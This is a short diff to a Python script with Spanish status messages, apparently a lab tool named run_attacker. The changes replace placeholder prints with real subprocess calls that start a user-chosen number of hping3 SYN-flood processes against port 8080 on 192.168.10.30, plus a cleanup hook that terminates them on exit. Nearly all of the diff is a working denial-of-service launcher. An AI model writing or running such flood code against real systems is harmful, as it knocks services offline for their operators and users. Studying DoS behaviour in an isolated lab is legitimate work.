@@ -1,7 +1,18 @@
+import atexit
+import subprocess
+
+
 def run_attacker():
     do_continue = True
     no_processes = 0
     processes = list()
+
+    def cleanup():
+        print("Terminando procesos iniciados.")
+        while processes:
+            processes.pop().terminate()
+
+    atexit.register(cleanup)
 
     while do_continue:
         # Ask how many inputs do you want.
@@ -17,12 +28,12 @@ def run_attacker():
             if new_no_processes > no_processes:
                 print(f"Iniciando {dif_no_processes} procesos de ataque.")
                 for _ in range(dif_no_processes):
-                    print("Starting attack process")
+                    processes.append(subprocess.Popen(["hping3", "-S", "--flood", "-V", "-p", "8080", "192.168.10.30"]))
                 print(f"Se iniciaron {dif_no_processes} procesos de ataque satisfactoriamente.")
             else:
                 print(f"Deteniendo {dif_no_processes} procesos de ataque.")
                 for _ in range(dif_no_processes):
-                    print("Stopping attack process")
+                    processes.pop().terminate()
                 print(f"Se detuvieron {dif_no_processes} procesos de ataque satisfactoriamente.")
             no_processes = new_no_processes
 
